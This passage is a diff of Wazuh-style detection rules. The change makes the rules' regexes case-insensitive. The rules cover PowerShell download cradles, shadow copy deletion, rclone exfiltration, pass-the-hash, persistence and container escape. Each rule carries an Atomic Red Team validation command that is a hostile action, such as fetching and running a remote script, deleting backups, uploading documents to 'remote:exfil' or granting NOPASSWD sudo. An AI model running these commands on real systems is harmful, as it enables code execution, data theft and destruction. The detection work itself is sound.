-    <field name="win.eventdata.image" type="pcre2">\\\\powershell\.exe$|\\\\pwsh\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">DownloadString|DownloadFile|Invoke\-WebRequest|Net\.WebClient|iwr\ |curl\ </field>
-    <field name="win.eventdata.commandLine" type="pcre2">IEX|Invoke\-Expression|iex\(|\|\ iex</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\powershell\.exe$|\\pwsh\.exe$</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)DownloadString|DownloadFile|Invoke\-WebRequest|Net\.WebClient|iwr\ |curl\ </field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)IEX|Invoke\-Expression|iex\(|\|\ iex</field>
     <description>PowerShell Download Cradle</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1059.001): powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://&lt;host&gt;/a.ps1')"</info>
@@ -780,8 +780,8 @@
 <group name="sysmon,">
   <rule id="100142" level="12">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.image" type="pcre2">\\\\powershell\.exe$|\\\\pwsh\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">\ \-enc|\ \-EncodedCommand|\ \-e\ |\ \-ec\ </field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\powershell\.exe$|\\pwsh\.exe$</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)\ \-enc|\ \-EncodedCommand|\ \-e\ |\ \-ec\ </field>
     <description>PowerShell Encoded Command Execution</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1059.001): powershell.exe -nop -w hidden -enc &lt;base64-of-utf16le-command&gt;</info>
@@ -798,8 +798,8 @@
 <group name="sysmon,">
   <rule id="100143" level="14">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.image">\\\\regsvr32\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">scrobj|/i:http|\.sct</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\regsvr32\.exe$</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)scrobj|/i:http|\.sct</field>
     <description>regsvr32 Scriptlet Execution (Squiblydoo)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1218.010): regsvr32.exe /s /u /i:http://&lt;host&gt;/payload.sct scrobj.dll</info>
@@ -816,9 +816,9 @@
 <group name="sysmon,">
   <rule id="100144" level="8">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.image" type="pcre2">\\\\7z\.exe$|\\\\rar\.exe$|\\\\winrar\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">\ a\ |\ \-hp</field>
-    <field name="win.eventdata.commandLine" type="pcre2">\\\\Users\\\\|\\\\Documents|\\\\Desktop|\\\\Shares</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\7z\.exe$|\\rar\.exe$|\\winrar\.exe$</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)\ a\ |\ \-hp</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)\\Users\\|\\Documents|\\Desktop|\\Shares</field>
     <description>Bulk Archive Creation Consistent With Collection Staging</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1560.001): 7z.exe a -hp'pass' C:\Windows\Temp\loot.7z C:\Users\&lt;user&gt;\Documents</info>
@@ -836,8 +836,8 @@
 <group name="sysmon,">
   <rule id="100145" level="12">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.image" type="pcre2">\\rclone\.exe$|\\megacmd\.exe$|\\MEGAclient\.exe$|\\winscp\.com$|\\winscp\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">copy|sync|move|put</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\rclone\.exe$|\\megacmd\.exe$|\\MEGAclient\.exe$|\\winscp\.com$|\\winscp\.exe$</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)copy|sync|move|put</field>
     <description>Bulk Upload to Cloud Storage via Command-Line Tooling (1/2: rclone_like)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1567.002): rclone copy C:\Users\victim\Documents remote:exfil --transfers 8</info>
@@ -851,7 +851,7 @@
 <group name="sysmon,">
   <rule id="100146" level="12">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.originalFileName">^rclone\.exe$</field>
+    <field name="win.eventdata.originalFileName" type="pcre2">(?i)^rclone\.exe$</field>
     <description>Bulk Upload to Cloud Storage via Command-Line Tooling (2/2: renamed_rclone)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1567.002): rclone copy C:\Users\victim\Documents remote:exfil --transfers 8</info>
@@ -869,7 +869,7 @@
 <group name="sysmon,">
   <rule id="100147" level="14">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.commandLine">wbadmin\ delete</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)wbadmin\ delete</field>
     <description>Backup and Recovery Destruction Before Encryption (1/2: wbadmin)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1490): wbadmin delete catalog -quiet | bcdedit /set {default} recoveryenabled No</info>
@@ -883,7 +883,7 @@
 <group name="sysmon,">
   <rule id="100148" level="14">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.commandLine" type="pcre2">recoveryenabled\ no|bootstatuspolicy\ ignoreallfailures</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)recoveryenabled\ no|bootstatuspolicy\ ignoreallfailures</field>
     <description>Backup and Recovery Destruction Before Encryption (2/2: bcdedit)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1490): wbadmin delete catalog -quiet | bcdedit /set {default} recoveryenabled No</info>
@@ -901,8 +901,8 @@
 <group name="windows,">
   <rule id="100149" level="12">
     <if_group>windows</if_group>
-    <field name="win.eventdata.image">\\vssadmin\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">(?=.*delete)(?=.*shadows)</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\vssadmin\.exe$</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)(?=.*delete)(?=.*shadows)</field>
     <description>Shadow Copy Deletion via VSSAdmin or WMIC (1/3: vssadmin)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1490): vssadmin.exe delete shadows /all /quiet</info>
@@ -917,8 +917,8 @@
 <group name="windows,">
   <rule id="100150" level="12">
     <if_group>windows</if_group>
-    <field name="win.eventdata.image">\\wmic\.exe$</field>
-    <field name="win.eventdata.commandLine">shadowcopy\ delete</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\wmic\.exe$</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)shadowcopy\ delete</field>
     <description>Shadow Copy Deletion via VSSAdmin or WMIC (2/3: wmic)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1490): vssadmin.exe delete shadows /all /quiet</info>
@@ -933,7 +933,7 @@
 <group name="windows,">
   <rule id="100151" level="12">
     <if_group>windows</if_group>
-    <field name="win.eventdata.commandLine" type="pcre2">(?=.*Get\-WmiObject)(?=.*Win32_ShadowCopy)(?=.*Delete)</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)(?=.*Get\-WmiObject)(?=.*Win32_ShadowCopy)(?=.*Delete)</field>
     <description>Shadow Copy Deletion via VSSAdmin or WMIC (3/3: powershell)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1490): vssadmin.exe delete shadows /all /quiet</info>
@@ -951,8 +951,8 @@
 <group name="sysmon,">
   <rule id="100152" level="14">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.commandLine" type="pcre2">net\ stop\ |sc\ stop\ |Stop\-Service</field>
-    <field name="win.eventdata.commandLine" type="pcre2">sql|veeam|backup|exchange|vss|msexchange</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)net\ stop\ |sc\ stop\ |Stop\-Service</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)sql|veeam|backup|exchange|vss|msexchange</field>
     <frequency>3</frequency>
     <timeframe>300</timeframe>
     <same_field>host</same_field>
@@ -972,8 +972,8 @@
 <group name="windows,">
   <rule id="100153" level="12">
     <if_group>windows</if_group>
-    <field name="win.eventdata.parentImage" type="pcre2">\\winword\.exe$|\\excel\.exe$|\\powerpnt\.exe$|\\outlook\.exe$</field>
-    <field name="win.eventdata.image" type="pcre2">\\powershell\.exe$|\\cmd\.exe$|\\wscript\.exe$|\\cscript\.exe$|\\mshta\.exe$|\\rundll32\.exe$</field>
+    <field name="win.eventdata.parentImage" type="pcre2">(?i)\\winword\.exe$|\\excel\.exe$|\\powerpnt\.exe$|\\outlook\.exe$</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\powershell\.exe$|\\cmd\.exe$|\\wscript\.exe$|\\cscript\.exe$|\\mshta\.exe$|\\rundll32\.exe$</field>
     <description>Office Application Spawns a Script Interpreter</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1566.001): Open a macro-enabled document whose AutoOpen runs Shell("cmd.exe /c ..."), | so WINWORD.EXE becomes the parent of cmd.exe.</info>
@@ -991,9 +991,9 @@
 <group name="sysmon,">
   <rule id="100154" level="12">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.parentImage" type="pcre2">\\\\mmc\.exe$|\\\\dllhost\.exe$</field>
-    <field name="win.eventdata.image" type="pcre2">\\\\cmd\.exe$|\\\\powershell\.exe$|\\\\mshta\.exe$</field>
-    <field name="win.eventdata.parentCommandLine" type="pcre2">\-Embedding|MMC20</field>
+    <field name="win.eventdata.parentImage" type="pcre2">(?i)\\mmc\.exe$|\\dllhost\.exe$</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\cmd\.exe$|\\powershell\.exe$|\\mshta\.exe$</field>
+    <field name="win.eventdata.parentCommandLine" type="pcre2">(?i)\-Embedding|MMC20</field>
     <description>Lateral Execution via DCOM Object</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1021.003): $c=[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','&lt;host&gt;')) | $c.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c calc','7')</info>
@@ -1010,10 +1010,10 @@
 <group name="windows,windows_security,">
   <rule id="100155" level="8">
     <if_group>windows_security</if_group>
-    <field name="win.system.eventID">^4624$</field>
-    <field name="win.eventdata.logonType">^3$</field>
-    <field name="win.eventdata.authenticationPackageName">^NTLM$</field>
-    <field name="win.eventdata.logonProcessName">^NtLmSsp$</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^4624$</field>
+    <field name="win.eventdata.logonType" type="pcre2">(?i)^3$</field>
+    <field name="win.eventdata.authenticationPackageName" type="pcre2">(?i)^NTLM$</field>
+    <field name="win.eventdata.logonProcessName" type="pcre2">(?i)^NtLmSsp$</field>
     <description>Pass-the-Hash via NTLM Network Logon</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1550.002): mimikatz.exe "sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt; /run:cmd.exe"</info>
@@ -1032,8 +1032,8 @@
 <group name="windows,windows_system,">
   <rule id="100156" level="12">
     <if_group>windows_system</if_group>
-    <field name="win.system.eventID">^7045$</field>
-    <field name="win.eventdata.serviceName">^[A-Za-z0-9]{8}$</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^7045$</field>
+    <field name="win.eventdata.serviceName" type="pcre2">^[A-Za-z0-9]{8}$</field>
     <description>PsExec-style Remote Service Installation (1/2: selection, service_name)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1021.002): PsExec.exe \\&lt;host&gt; -accepteula cmd.exe</info>
@@ -1047,8 +1047,8 @@
 <group name="windows,windows_system,">
   <rule id="100157" level="12">
     <if_group>windows_system</if_group>
-    <field name="win.system.eventID">^7045$</field>
-    <field name="win.eventdata.imagePath" type="pcre2">\\ADMIN\$\\|\\PSEXESVC|\\Windows\\Temp\\|\-s\ cmd</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^7045$</field>
+    <field name="win.eventdata.imagePath" type="pcre2">(?i)\\ADMIN\$\\|\\PSEXESVC|\\Windows\\Temp\\|\-s\ cmd</field>
     <description>PsExec-style Remote Service Installation (2/2: selection, image_path)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1021.002): PsExec.exe \\&lt;host&gt; -accepteula cmd.exe</info>
@@ -1065,8 +1065,8 @@
 <group name="windows,windows_security,">
   <rule id="100158" level="12">
     <if_group>windows_security</if_group>
-    <field name="win.system.eventID">^5145$</field>
-    <field name="win.eventdata.objectName" type="pcre2">ADMIN\$|C\$</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^5145$</field>
+    <field name="win.eventdata.objectName" type="pcre2">(?i)ADMIN\$|C\$</field>
     <description>Write to an Administrative Share</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1021.002): copy payload.exe \\&lt;host&gt;\C$\Windows\Temp\payload.exe</info>
@@ -1084,7 +1084,7 @@
 <group name="sysmon,">
   <rule id="100159" level="8">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.parentImage">\\\\wsmprovhost\.exe$</field>
+    <field name="win.eventdata.parentImage" type="pcre2">(?i)\\wsmprovhost\.exe$</field>
     <description>Remote Code Execution via WinRM and PowerShell Remoting</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1021.006): Invoke-Command -ComputerName &lt;host&gt; -ScriptBlock { whoami }</info>
@@ -1101,8 +1101,8 @@
 <group name="sysmon,">
   <rule id="100160" level="12">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.parentImage">\\\\WmiPrvSE\.exe$</field>
-    <field name="win.eventdata.image" type="pcre2">\\\\powershell\.exe$|\\\\pwsh\.exe$|\\\\cmd\.exe$|\\\\mshta\.exe$|\\\\rundll32\.exe$|\\\\regsvr32\.exe$|\\\\certutil\.exe$</field>
+    <field name="win.eventdata.parentImage" type="pcre2">(?i)\\WmiPrvSE\.exe$</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\powershell\.exe$|\\pwsh\.exe$|\\cmd\.exe$|\\mshta\.exe$|\\rundll32\.exe$|\\regsvr32\.exe$|\\certutil\.exe$</field>
     <description>Remote Process Creation via WMI</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1047): wmic /node:&lt;host&gt; process call create "cmd.exe /c whoami &gt; C:\Windows\Temp\o.txt"</info>
@@ -1119,8 +1119,8 @@
 <group name="windows,windows_security,">
   <rule id="100161" level="14">
     <if_group>windows_security</if_group>
-    <field name="win.system.eventID" type="pcre2">^5136$|^4662$</field>
-    <field name="win.eventdata.objectDN">CN=AdminSDHolder</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^5136$|^4662$</field>
+    <field name="win.eventdata.objectDN" type="pcre2">(?i)CN=AdminSDHolder</field>
     <description>AdminSDHolder Container Modified</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1098): dsacls "CN=AdminSDHolder,CN=System,DC=tyrian,DC=lab" /G tyrian\attacker:GA</info>
@@ -1139,8 +1139,8 @@
 <group name="linux,audit,">
   <rule id="100162" level="12">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_exec$</field>
-    <field name="audit.exe" type="pcre2">/useradd$|/adduser$</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
+    <field name="audit.exe" type="pcre2">(?i)/useradd$|/adduser$</field>
     <description>Linux Account Created or Added to a Privileged Group (1/3: account_created)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1136.001): useradd -m svcbackup | usermod -aG sudo svcbackup</info>
@@ -1155,9 +1155,9 @@
 <group name="linux,audit,">
   <rule id="100163" level="12">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_exec$</field>
-    <field name="audit.exe" type="pcre2">/usermod$|/gpasswd$</field>
-    <field name="audit.execve.a2" type="pcre2">sudo|wheel|admin|root</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
+    <field name="audit.exe" type="pcre2">(?i)/usermod$|/gpasswd$</field>
+    <field name="audit.execve.a2" type="pcre2">(?i)sudo|wheel|admin|root</field>
     <description>Linux Account Created or Added to a Privileged Group (2/3: privileged_group)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1136.001): useradd -m svcbackup | usermod -aG sudo svcbackup</info>
@@ -1172,7 +1172,7 @@
 <group name="linux,audit,">
   <rule id="100164" level="12">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_passwd$</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_passwd$</field>
     <description>Linux Account Created or Added to a Privileged Group (3/3: passwd_file_edit)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1136.001): useradd -m svcbackup | usermod -aG sudo svcbackup</info>
@@ -1190,7 +1190,7 @@
 <group name="linux,audit,">
   <rule id="100165" level="12">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_cron$</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_cron$</field>
     <description>Linux Scheduled Task Persistence via cron</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1053.003): echo '* * * * * root /dev/shm/beacon' &gt; /etc/cron.d/tyrian-test | (crontab -l 2&gt;/dev/null; echo '@reboot /tmp/beacon') | crontab -</info>
@@ -1207,7 +1207,7 @@
 <group name="linux,audit,">
   <rule id="100166" level="8">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_modules$</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_modules$</field>
     <description>Linux Kernel Module Loaded</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1547.006): modprobe dummy | insmod ./tyrian-test.ko</info>
@@ -1224,7 +1224,7 @@
 <group name="linux,audit,">
   <rule id="100167" level="14">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_ldpreload$</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_ldpreload$</field>
     <description>Linux Shared Library Hijack via ld.so.preload</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1574.006): echo /dev/shm/libhook.so &gt; /etc/ld.so.preload</info>
@@ -1241,8 +1241,8 @@
 <group name="linux,audit,">
   <rule id="100168" level="12">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_ssh_keys</field>
-    <field name="audit.file.name">authorized_keys</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_ssh_keys</field>
+    <field name="audit.file.name" type="pcre2">(?i)authorized_keys</field>
     <description>Linux SSH authorized_keys Modified</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1098.004): echo 'ssh-ed25519 AAAAC3Nz... attacker@host' &gt;&gt; ~/.ssh/authorized_keys</info>
@@ -1259,7 +1259,7 @@
 <group name="linux,audit,">
   <rule id="100169" level="12">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_systemd$</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_systemd$</field>
     <description>Linux systemd Unit Created or Modified</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1543.002): printf '[Service]\nExecStart=/dev/shm/beacon\n[Install]\nWantedBy=multi-user.target\n' \ | &gt; /etc/systemd/system/tyrian-test.service | systemctl daemon-reload</info>
@@ -1276,7 +1276,7 @@
 <group name="windows,windows_security,">
   <rule id="100170" level="12">
     <if_group>windows_security</if_group>
-    <field name="win.system.eventID" type="pcre2">^4728$|^4732$|^4756$</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^4728$|^4732$|^4756$</field>
     <description>Account Added to a Privileged Local or Domain Group</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1136.001): net user svcbackup 'Autumn2026!' /add | net localgroup administrators svcbackup /add</info>
@@ -1293,7 +1293,7 @@
 <group name="sysmon,">
   <rule id="100171" level="8">
     <if_group>sysmon_event1</if_group>
-    <field name="win.eventdata.targetObject" type="pcre2">\\\\CurrentVersion\\\\Run\\\\|\\\\CurrentVersion\\\\RunOnce\\\\|\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run\\\\</field>
+    <field name="win.eventdata.targetObject" type="pcre2">(?i)\\CurrentVersion\\Run\\|\\CurrentVersion\\RunOnce\\|\\CurrentVersion\\Policies\\Explorer\\Run\\</field>
     <description>Autorun Persistence via Registry Run Key</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1547.001): reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d C:\Windows\Temp\p.exe /f</info>
@@ -1310,8 +1310,8 @@
 <group name="windows,windows_system,">
   <rule id="100172" level="12">
     <if_group>windows_system</if_group>
-    <field name="win.system.eventID">^7045$</field>
-    <field name="win.eventdata.serviceFileName" type="pcre2">\\\\Temp\\\\|\\\\Users\\\\Public\\\\|\\\\AppData\\\\|\\\\ProgramData\\\\|powershell|cmd\.exe\ /c|rundll32</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^7045$</field>
+    <field name="win.eventdata.serviceFileName" type="pcre2">(?i)\\Temp\\|\\Users\\Public\\|\\AppData\\|\\ProgramData\\|powershell|cmd\.exe\ /c|rundll32</field>
     <description>Service Installed From a Suspicious Path</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1543.003): sc.exe create TyrianTest binPath= C:\Windows\Temp\p.exe start= auto</info>
@@ -1328,9 +1328,9 @@
 <group name="windows,">
   <rule id="100173" level="12">
     <if_group>windows</if_group>
-    <field name="win.eventdata.image" type="pcre2">\\schtasks\.exe$|\\at\.exe$</field>
-    <field name="win.eventdata.commandLine">/create</field>
-    <field name="win.eventdata.commandLine" type="pcre2">powershell|\-enc|AppData|\\Temp\\|rundll32|mshta|DownloadString</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\schtasks\.exe$|\\at\.exe$</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)/create</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)powershell|\-enc|AppData|\\Temp\\|rundll32|mshta|DownloadString</field>
     <description>Suspicious Scheduled Task Creation</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1053.005): schtasks /create /tn "Updater" /tr "powershell -w hidden -enc &lt;b64&gt;" /sc onlogon /ru SYSTEM</info>
@@ -1347,7 +1347,7 @@
 <group name="sysmon,">
   <rule id="100174" level="12">
     <if_group>sysmon_event1</if_group>
-    <field name="win.system.eventID" type="pcre2">^19$|^20$|^21$</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^19$|^20$|^21$</field>
     <description>WMI Event Subscription Persistence</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1546.003): Register a __EventFilter + CommandLineEventConsumer pair and bind them with a | __FilterToConsumerBinding (Sysmon EID 19/20/21).</info>
@@ -1365,8 +1365,8 @@
 <group name="windows,windows_security,">
   <rule id="100175" level="12">
     <if_group>windows_security</if_group>
-    <field name="win.system.eventID">^5136$</field>
-    <field name="win.eventdata.objectClass">^groupPolicyContainer$</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^5136$</field>
+    <field name="win.eventdata.objectClass" type="pcre2">(?i)^groupPolicyContainer$</field>
     <description>Group Policy Object Modified (1/2: gpo_object)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1484.001): New-GPO -Name TyrianTest | New-GPLink -Target "DC=tyrian,DC=lab" | SharpGPOAbuse.exe --AddComputerTask --GPOName "Default Domain Policy" --Command cmd.exe --Arguments "/c whoami"</info>
@@ -1380,9 +1380,9 @@
 <group name="windows,windows_security,">
   <rule id="100176" level="12">
     <if_group>windows_security</if_group>
-    <field name="win.system.eventID">^5145$</field>
-    <field name="win.eventdata.shareName">SYSVOL</field>
-    <field name="win.eventdata.relativeTargetName">Policies</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^5145$</field>
+    <field name="win.eventdata.shareName" type="pcre2">(?i)SYSVOL</field>
+    <field name="win.eventdata.relativeTargetName" type="pcre2">(?i)Policies</field>
     <description>Group Policy Object Modified (2/2: sysvol_write)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1484.001): New-GPO -Name TyrianTest | New-GPLink -Target "DC=tyrian,DC=lab" | SharpGPOAbuse.exe --AddComputerTask --GPOName "Default Domain Policy" --Command cmd.exe --Arguments "/c whoami"</info>
@@ -1400,9 +1400,9 @@
 <group name="linux,audit,">
   <rule id="100177" level="14">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_exec$</field>
-    <field name="audit.exe">/nsenter$</field>
-    <field name="audit.execve.a1">\-\-target</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
+    <field name="audit.exe" type="pcre2">(?i)/nsenter$</field>
+    <field name="audit.execve.a1" type="pcre2">(?i)\-\-target</field>
     <description>Linux Container Escape Attempt (1/3: nsenter_host_ns)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1611): nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash | docker run --rm --privileged -v /:/host alpine chroot /host sh</info>
@@ -1416,8 +1416,8 @@
 <group name="linux,audit,">
   <rule id="100178" level="14">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_exec$</field>
-    <field name="audit.execve.a2">docker\.sock</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
+    <field name="audit.execve.a2" type="pcre2">(?i)docker\.sock</field>
     <description>Linux Container Escape Attempt (2/3: docker_socket)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1611): nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash | docker run --rm --privileged -v /:/host alpine chroot /host sh</info>
@@ -1431,9 +1431,9 @@
 <group name="linux,audit,">
   <rule id="100179" level="14">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_exec$</field>
-    <field name="audit.exe" type="pcre2">/docker$|/podman$</field>
-    <field name="audit.execve.a2">\-\-privileged</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
+    <field name="audit.exe" type="pcre2">(?i)/docker$|/podman$</field>
+    <field name="audit.execve.a2" type="pcre2">(?i)\-\-privileged</field>
     <description>Linux Container Escape Attempt (3/3: privileged_container)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1611): nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash | docker run --rm --privileged -v /:/host alpine chroot /host sh</info>
@@ -1450,7 +1450,7 @@
 <group name="linux,audit,">
   <rule id="100180" level="12">
     <if_group>audit</if_group>
-    <field name="audit.key">^tyrian_sudoers$</field>
+    <field name="audit.key" type="pcre2">(?i)^tyrian_sudoers$</field>
     <description>Linux sudoers Policy Modified</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1548.003): echo 'attacker ALL=(ALL) NOPASSWD: ALL' &gt; /etc/sudoers.d/tyrian-test</info>
@@ -1467,8 +1467,8 @@
 <group name="windows,windows_security,">
   <rule id="100181" level="14">
     <if_group>windows_security</if_group>
-    <field name="win.system.eventID">^5136$</field>
-    <field name="win.eventdata.attributeLDAPDisplayName">^msDS\-AllowedToActOnBehalfOfOtherIdentity$</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^5136$</field>
+    <field name="win.eventdata.attributeLDAPDisplayName" type="pcre2">(?i)^msDS\-AllowedToActOnBehalfOfOtherIdentity$</field>
     <description>Resource-Based Constrained Delegation Configured on an Object</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1098): Set-ADComputer TARGET$ -PrincipalsAllowedToDelegateToAccount ATTACKER$ | rbcd.py -delegate-to TARGET$ -delegate-from ATTACKER$ -action write domain/user:pass</info>
@@ -1487,8 +1487,8 @@
 <group name="windows,windows_security,">
   <rule id="100182" level="12">
     <if_group>windows_security</if_group>
-    <field name="win.system.eventID">^5136$</field>
-    <field name="win.eventdata.attributeLDAPDisplayName">^msDS\-AllowedToDelegateTo$</field>
+    <field name="win.system.eventID" type="pcre2">(?i)^5136$</field>
+    <field name="win.eventdata.attributeLDAPDisplayName" type="pcre2">(?i)^msDS\-AllowedToDelegateTo$</field>
     <description>Unconstrained or Constrained Delegation Enabled on an Account (1/2: delegation_target_list)</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1098): Set-ADAccountControl -Identity SRV01$ -TrustedForDelegation $true | Set-ADUser svc_web -Add @{'msDS-AllowedToDelegateTo'='CIFS/dc01.tyrian.lab'}</info>
@@ -1503,9 +1503,9 @@
 <group name="windows,windows_security,">
   <rule id="100183" level="12">
     <if_group>windows_security</if_group>
-    <field name="win.system.eventID">^5136$</field>
-    <field name="win.eventdata.attributeLDAPDisplayName">^userAccountControl$</field>
-    <field name="win.eventdata.attributeValue" type="pcre2">524288|16777216</field>
